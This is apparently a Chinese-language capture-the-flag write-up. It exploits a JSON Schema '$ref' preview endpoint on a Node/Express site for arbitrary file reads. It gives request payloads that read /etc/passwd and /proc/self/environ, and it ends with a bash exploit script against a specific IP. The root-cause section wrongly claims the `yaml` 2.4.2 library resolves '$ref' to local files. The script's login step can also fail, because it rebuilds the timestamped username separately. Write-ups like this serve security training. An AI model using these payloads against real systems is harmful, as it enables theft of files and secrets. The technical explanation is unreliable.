
## 阶段一：前期资产收集

通过对站点主页进行探索，收集到如下核心目录与路由：

```
GET /
├── /login          -> 审计员登录
├── /register       -> 审计员注册
├── /dashboard      -> 仪表盘（需认证）
├── /templates      -> 审计模板预览控制台
├── /reports        -> 审计报告页
└── /static/app.js  -> 前端逻辑
```

利用 `curl -I` 命令抓取 HTTP 响应头信息，借此判断服务端的技术架构：

```
Server: nginx/1.25.5
X-Powered-By: Express
```

由此可知，目标系统基于 **Node.js** 环境并搭配了 **Express** 框架构建。

---

## 阶段二：业务功能研判

### 2.1 账户注册与会话机制

在成功创建并登录常规的审计员账号后，系统会通过 `/api/user/session` 接口下发当前用户的鉴权数据：

```json
{
  "user": {"uid": 1633, "username": "xxx", "role": "auditor"},
  "routes": ["/api/template/import", "/api/template/preview"]
}
```

根据返回结果，`auditor` 角色被赋予了以下两个核心 API 的访问权限：
- `POST /api/template/import` — 负责导入自定义的审计模板
- `POST /api/template/preview` — 用于模板的实时预览

### 2.2 解析与预览机制探究

在 `/templates` 路由下，页面中包含一段英文说明：

> "Paste JSON or YAML schema. The preview service resolves nested references for auditors."

注意这里的核心词汇 **"resolves nested references"**，这暗示了服务端能够处理 JSON Schema 里的 `$ref` 外部引用。在后端的实际开发场景中，此类特性往往依赖 `json-schema-ref-parser` 等库或是 YAML 解析器自身的 `$ref` 支持来实现。如果配置不当，极易引入任意文件读取（LFI）的安全隐患。

### 2.3 关于 Reports 模块

浏览 `/reports` 页面时发现系统给出了如下提示：

> "No critical finding is visible to ordinary auditors."

这明确表明部分机密信息对普通用户不可见，必须具备更高权限（如管理员）方可查看，这与题目背景中提到的 **Shadow Vault** 设定相吻合。

---

## 阶段三：安全漏洞确认

### 3.1 Payload 的构建与投放

我们尝试向 `/api/template/preview` 接口直接发送包含 `$ref` 关键字的恶意 JSON 数据：

```
POST /api/template/preview
Content-Type: application/json

{
  "schema": {
    "$ref": "/etc/passwd"
  }
}
```

### 3.2 服务器回显

服务端成功回显了 `/etc/passwd` 文件的全部数据。至此，**任意文件读取**漏洞被成功证实。

**产生原因分析**：服务端程序在接收并解析由前端传入的 JSON Schema 数据时，调用了带有 `$ref` 解析功能的 YAML/JSON 库（经后续确认为 `yaml` 2.4.2）。由于该依赖包内置的 `YAML.parse()` 方法在处理 `$ref` 节点时，默认并未阻断对本地文件系统的访问，同时也缺失了路径白名单校验及沙箱隔离机制。这就导致恶意用户能够通过修改 `$ref` 的指向路径，轻松窃取服务器上的敏感文件。

---

## 阶段四：深度漏洞利用

### 4.1 敏感信息探测

第一步是尝试提取当前进程的环境变量，因此将目标指向 `/proc/self/environ`：

```
POST /api/template/preview
Content-Type: application/json

{
  "schema": {
    "type": "object",
    "properties": {
      "content": {
        "$ref": "/proc/self/environ"
      }
    }
  }
}
```

**关键技巧提示**：这里特意将 `$ref` 嵌套在 `properties.content` 层级之下，而不是直接放在 schema 的最外层。这种做法的目的是防止 YAML 引擎在读取类似 JavaScript 等源代码文件时引发语法解析异常（直接解析会导致解析器试图将 JS 源码视为 YAML 格式从而崩溃），从而大幅提升读取复杂文件时的稳定性。

### 4.2 提取最终 Flag

在获取到的环境变量数据中，我们直接找到了目标 Flag 字符串：

```
NODE_VERSION=20.20.2
HOSTNAME=836f0052f625
FLAG=ISCC{black_box_schema_ref_to_shadow_vault_2026}
PWD=/app
NODE_ENV=production
```

测试任务圆满完成，成功拿下 Flag。

---

## 附录：自动化 Exploit 脚本参考

```bash
#!/bin/bash
# 一键利用脚本

BASE="http://39.105.213.28:12606"

# Step 1: 注册
curl -s -c /tmp/sl.txt -b /tmp/sl.txt \
  "$BASE/api/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn_'$(date +%s)'","password":"pwn"}' > /dev/null

# Step 2: 登录
curl -s -c /tmp/sl.txt -b /tmp/sl.txt \
  "$BASE/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn_'$(date +%s)'","password":"pwn"}' > /dev/null

# Step 3: 获取 Flag
curl -s -b /tmp/sl.txt \
  "$BASE/api/template/preview" \
  -H 'Content-Type: application/json' \
  -d '{"schema":{"type":"object","properties":{"x":{"$ref":"/proc/self/environ"}}}}' \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['preview']['properties']['x'])"
```